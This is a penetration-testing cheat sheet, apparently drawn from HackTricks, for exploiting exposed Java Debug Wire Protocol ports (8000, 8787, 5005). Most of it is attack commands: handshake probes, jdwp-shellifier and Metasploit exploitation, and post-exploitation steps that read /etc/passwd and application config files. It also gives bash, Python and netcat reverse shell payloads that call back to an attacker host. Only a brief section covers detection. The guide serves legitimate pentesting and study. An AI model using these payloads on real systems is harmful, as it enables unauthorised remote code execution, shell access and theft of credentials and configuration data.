# Port 8000/8787/5005 - JDWP (Java Debug Wire Protocol)

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Remote Code Execution](#remote-code-execution)

---

## Enumeration

### Quick Check (One-liner)

```shell
printf "JDWP-Handshake" | nc -n $rhost 8000 && echo 'JDWP Exposed - RCE Possible!'
```

### Nmap Scripts

```shell
nmap -sV -sC -p8000,8787,5005 $rhost
nmap -p8000 --script "jdwp-version,jdwp-info" $rhost
```

### Banner Grabbing

```shell
nc -vn $rhost 8000

# JDWP handshake starts with "JDWP-Handshake"
echo "JDWP-Handshake" | nc $rhost 8000
```

### Check for JDWP

```shell
# If it responds with "JDWP-Handshake", JDWP is running
printf "JDWP-Handshake" | nc -n $rhost 8000

# Using nmap
nmap -sV -p8000 --script "jdwp-version" $rhost
```

---

## Exploitation

### jdwp-shellifier

```shell
# https://github.com/hugsy/jdwp-shellifier

git clone https://github.com/hugsy/jdwp-shellifier.git
cd jdwp-shellifier

# Execute command
python jdwp-shellifier.py -t $rhost -p 8000 --cmd "id"

# Reverse shell
python jdwp-shellifier.py -t $rhost -p 8000 --break-on "java.lang.String.indexOf" --cmd "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
```

### Using jdb (Java Debugger)

```shell
# Connect to JDWP
jdb -connect com.sun.jdi.SocketAttach:hostname=$rhost,port=8000

# List threads
threads

# Suspend all threads
suspend

# Get classes
classes

# Execute code (need to find right breakpoint)
# This is complex and requires Java knowledge
```

### Metasploit Module

```shell
msfconsole
use exploit/multi/misc/java_jdwp_debugger
set RHOSTS $rhost
set RPORT 8000
set LHOST $lhost
set LPORT $lport
exploit
```

---

## Remote Code Execution

### Method 1: jdwp-shellifier with Breakpoint

```shell
# Find common breakpoint
python jdwp-shellifier.py -t $rhost -p 8000 --break-on "java.net.ServerSocket.accept"

# Execute on breakpoint hit
python jdwp-shellifier.py -t $rhost -p 8000 --break-on "java.net.ServerSocket.accept" --cmd "touch /tmp/pwned"
```

### Method 2: Nmap Script

```shell
# RCE via nmap
nmap -p8000 --script "jdwp-exec" --script-args cmd="id" $rhost

# With specific breakpoint
nmap -p8000 --script "jdwp-exec" --script-args cmd="whoami" $rhost
```

### Method 3: Python Script

```python
#!/usr/bin/env python3
import socket

def jdwp_handshake(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # JDWP Handshake
    s.send(b"JDWP-Handshake")
    response = s.recv(14)
    
    if response == b"JDWP-Handshake":
        print("[+] JDWP Handshake successful")
        return s
    else:
        print("[-] JDWP Handshake failed")
        return None

# Usage
sock = jdwp_handshake("$rhost", 8000)
if sock:
    # Continue with JDWP protocol exploitation
    pass
```

---

## Common JDWP Ports

| Port | Common Usage |
|------|-------------|
| 5005 | Default debug port |
| 8000 | Common alternative |
| 8787 | JBoss debug |
| 9999 | Various apps |

---

## Post Exploitation

### Read Files

```shell
# Using jdwp-shellifier
python jdwp-shellifier.py -t $rhost -p 8000 --cmd "cat /etc/passwd"

# Read Java config
python jdwp-shellifier.py -t $rhost -p 8000 --cmd "cat /opt/app/config.properties"
```

### Reverse Shell Payloads

```shell
# Bash
python jdwp-shellifier.py -t $rhost -p 8000 --cmd "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"

# Python
python jdwp-shellifier.py -t $rhost -p 8000 --cmd "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

# Netcat
python jdwp-shellifier.py -t $rhost -p 8000 --cmd "nc -e /bin/bash $lhost $lport"
```

---

## Detection and Prevention

```shell
# JDWP should never be exposed
# Check JVM arguments for debug flags:
# -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8000
# -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000
```

---

## Tools

- jdwp-shellifier: https://github.com/hugsy/jdwp-shellifier
- jdb (Java Debugger): Part of JDK
- Metasploit java_jdwp_debugger module

---

## References

- [HackTricks - JDWP](https://book.hacktricks.wiki/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol.html)
